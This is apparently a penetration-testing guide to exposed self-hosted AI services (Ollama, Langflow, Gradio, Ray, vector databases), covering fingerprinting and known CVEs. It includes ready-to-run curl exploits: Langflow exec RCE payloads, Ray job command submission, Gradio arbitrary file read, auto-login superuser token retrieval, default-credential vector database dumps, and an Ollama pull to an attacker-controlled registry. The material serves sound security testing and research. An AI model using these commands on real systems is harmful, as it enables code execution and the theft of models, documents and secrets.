# Exposed Self-Hosted AI Services

{{#include ../banners/hacktricks-training.md}}

Teams that build AI features often run their own model runners, agent builders, demo UIs, compute clusters and vector databases. Many of these tools were designed for a laptop or a closed lab network, so they have **no authentication by default** or ship with an authentication shortcut enabled. When such a service is reachable by the attacker, the impact usually falls in one of these groups:

- Free use of GPUs and models, and theft of private models.
- Leakage of prompts, documents and embeddings.
- Leakage of secrets from the process environment (LLM provider keys, cloud credentials).
- Code execution, because some of these APIs run code **as a feature**.

This page describes how to find these services and what to test on each type of API. For hardening a self-hosted inference server and the llama.cpp `/slots` leak, see [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). For malicious model files, see [AI Models RCE](AI-Models-RCE.md).

## Fingerprinting

Send these requests without credentials. A JSON answer with the expected fields identifies the product, and often the version, which tells you which of the checks below apply. The ports are the documented defaults or the ports used in the official run examples.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Product | Common port | Unauthenticated request | What identifies it |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | Version JSON, list of local models |
| Langflow | 7860 | `GET /api/v1/version` | Langflow version JSON |
| Gradio | 7860 | `GET /config` | App config with the Gradio version and component IDs |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, list of submitted jobs |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Heartbeat value, Chroma version |
| Qdrant | 6333 | `GET /`, `GET /collections` | Qdrant version, collection list |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Weaviate version, classes |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Collection list, or an auth error |

These services are also often published behind a reverse proxy under a path prefix (for example `/ollama/` or `/ray/`), so repeat the requests under any prefix found in JavaScript bundles or API documentation.

## Unauthenticated inference and model-management APIs

Model runners usually expose a single REST API that mixes inference routes with administrative routes. Ollama is a good example. It has no built-in authentication and binds to `127.0.0.1:11434` by default, while `OLLAMA_HOST` changes the bind address.<sup>[[1]](#references)[[15]](#references)</sup> The official Docker image sets `OLLAMA_HOST=0.0.0.0:11434` inside the container, declares `EXPOSE 11434` and has no `USER` instruction, so the server runs as root in the container.<sup>[[16]](#references)</sup> `EXPOSE` does not publish the port on the host, so host reachability depends on the deployment. The documented `docker run` commands use `-p 11434:11434`, and Docker publishes such a mapping on all host interfaces unless a host IP is given.<sup>[[17]](#references)[[18]](#references)</sup>

What each group of routes gives an attacker:<sup>[[2]](#references)</sup>

| Routes | Impact when unauthenticated |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | List of local and loaded models, including private custom models |
| `POST /api/show` | Model details, including the Modelfile, template and **system prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Free inference on the victim's hardware |
| `POST /api/pull`, `/api/push` | Make the server download from, or upload a model to, an attacker-chosen registry |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Create, overwrite or delete models |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

A model list returned without credentials already proves the exposure. Custom models often carry an internal system prompt in `/api/show`. A pull towards your host proves that the server fetches manifests from attacker-chosen registries. `/api/push` towards your registry turns the exposure into model theft. Do not call create or delete routes on real targets.

Registry pulls are also a parser attack surface, because the server stores blobs using values from the remote manifest. In Probllama (CVE-2024-37032, fixed in Ollama 0.1.34) the manifest `digest` was used as a file name without validation. A malicious registry could therefore write files outside the blobs directory with `../` sequences. Pushing a planted manifest whose digest pointed to a local file leaked that file to the attacker registry. Wiz reached RCE in Docker, where the server runs as root, by writing a shared library and adding it to `/etc/ld.so.preload`, then calling `/api/chat` so that a new process loaded it.<sup>[[15]](#references)</sup> When a runner can pull from arbitrary registries, check how it turns manifest fields into paths.

## APIs that execute code by design

### Job submission APIs

Distributed compute frameworks treat code execution as their main feature. The Ray Jobs API on the dashboard port (8265) accepts an `entrypoint` shell command and runs it on the cluster.<sup>[[19]](#references)</sup> The Oligo ShadowRay research reports that the Jobs API has no authorization and that the dashboard binds to `0.0.0.0`. The matching CVE-2023-48022 is disputed because Ray expects to run only inside a controlled network.<sup>[[20]](#references)</sup> Ray added optional token authentication (`RAY_AUTH_MODE=token`) in 2.52.0. Ray 2.59 enables it by default for local clusters started with `ray.init()`; `ray start --head` without an available token can still start unauthenticated. Ray documents a broader default-authentication rollout for 2.61, so check the deployed version and launch mode rather than assuming the dashboard is open.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Dashboards of this kind also have helper routes worth probing on old versions. Before Ray 2.8.1, `/log_proxy?url=` fetched any HTTP(S) URL (SSRF to cloud metadata) and `/api/v0/logs/file` accepted an arbitrary `filename` path, both without authentication.<sup>[[8]](#references)</sup>

### Code "validation" endpoints that run function definitions

Agent builders that accept custom Python components sometimes "validate" the code by parsing it with `ast` and running only the function definitions with `exec()`. This is not safe. Python evaluates **decorators and default argument values when it defines the function**, so code placed there runs even if the function body never does. Langflow's `POST /api/v1/validate/code` worked this way, and was unauthenticated before 1.3.0 (CVE-2025-3248). Raising an exception that contains the command output makes the endpoint return the output in the response:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Test any endpoint that compiles, lints or "checks" user code for this pattern, and prefer a DNS callback as the proof.

### Auto-login and default superuser token routes

Single-user tools often ship a shortcut that logs every visitor in as the administrator. In Langflow, when `AUTO_LOGIN` is enabled, `GET /api/v1/auto_login` returns tokens for the default superuser to any caller. When it is disabled, the route answers `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 to 1.10.0 enabled it by default (CVE-2026-9103). Chaining it with the authenticated code-validation route above restores unauthenticated RCE (CVE-2026-9198).<sup>[[24]](#references)[[25]](#references)</sup> Current official release packages and Docker images disable automatic login and require a superuser password, but development branches keep it on.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Even without code execution, a superuser token gives access to every flow and to the stored provider credentials. For a related prerequisite check in automated testing, see [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## File-serving and RPC routes in ML demo UIs

ML demo frameworks serve uploaded and generated files through a generic route and let the frontend call server-side component helpers. Gradio exposes `/config`, `/upload` and `/file=<path>` for this.<sup>[[5]](#references)</sup> Two patterns are worth testing on any similar framework:

- **Traversal from an upload subdirectory:** if the file route only checks that the path starts inside the temp folder, upload a file to create a subdirectory, then climb out of it with `../` or `%2e%2e%2f`. Gradio 4.0 to 4.10 (CVE-2023-51449) was vulnerable this way.<sup>[[26]](#references)[[27]](#references)</sup> Send the request with `curl --path-as-is` so the client does not normalize the path.
- **Arbitrary method dispatch:** an endpoint that calls `getattr(component, fn_name)` with user input lets the attacker call internal helpers. Before 4.13.0, Gradio's `/component_server` did this. In 4.3 to 4.12, `move_resource_to_block_cache` copied any local file into the cache, where `/file=` could download it. In 3.47 to 3.50.2, other helpers gave file read and a full-read SSRF.<sup>[[26]](#references)[[28]](#references)</sup> A fixed server answers `Function not found.` for helpers that are not marked as server functions.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

On Hugging Face Spaces the Space secrets are environment variables, so `/proc/self/environ` is the most valuable file. Horizon3 read it with an HTTP `Range` header.<sup>[[26]](#references)</sup>

## Vector databases used by RAG

RAG stores chunks of the original documents, their embeddings and metadata in a vector database, and the assistant places the top results in its prompt. Read access therefore leaks the **plain text of private documents**. Write access lets an attacker insert chunks that are later retrieved into other users' prompts, which is persistent indirect prompt injection (see [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

For self-hosted vector databases, check whether authentication is configured or anonymous access is enabled:

- **Qdrant**: self-deployed instances listen on all interfaces with no authentication. When configured, the key goes in the `api-key` header or as `Authorization: Bearer`. Read-only and per-collection keys can exist.<sup>[[11]](#references)</sup>
- **Chroma**: authentication is disabled by default. Token auth uses `Authorization` or `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: requests without credentials are authenticated as `user: anonymous` when anonymous access is enabled, and get whatever permissions that user has.<sup>[[30]](#references)</sup>
- **Milvus**: authentication is off unless `common.security.authorizationEnabled` is `true`. When it is on, the default `root` user has the password `Milvus` and the token format is `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

A response containing private data without credentials indicates exposure. Where authentication is enabled, assess any unchanged default account separately:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Check whether the payloads contain document text, user identifiers or tenant names. To show write access without poisoning production data, create and immediately delete an empty, clearly named collection, and only when the scope allows it.

Authentication on these servers can also come too late. In Chroma's Python FastAPI server (1.0.0 to at least 1.5.8, CVE-2026-45829), the collection-creation route built the client-supplied embedding function before the authentication check. A configuration that referenced an attacker-controlled Hugging Face model with `trust_remote_code: true` ran the attacker's code even when the request was rejected. The Rust frontend was not affected.<sup>[[32]](#references)</sup> When a request carries model or plugin configuration, test it without credentials and watch for an outbound fetch to your model repository.

## References

- [1] [Ollama FAQ](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama API documentation](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow source - API v1 endpoints](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio source - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio source - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray source - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, Versions 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma source - Python client defaults](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma source - FastAPI server routes](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Security](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI specification](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI specification](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Connect to Milvus Server](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Ollama Remote Code Execution Vulnerability (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Docker documentation](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Publishing and exposing ports](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: First Known Attack Campaign Targeting AI Workloads Exploited In The Wild](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray token authentication](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Unsafe at Any Speed: Abusing Python Exec for Unauth RCE in Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow source - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Exploiting File Read Vulnerabilities in Gradio to Steal Secrets from Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio advisory GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio fix commit for `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chroma-native Auth](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Authentication](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Authenticate User Access](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast Served Pre-Auth](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)

{{#include ../banners/hacktricks-training.md}}
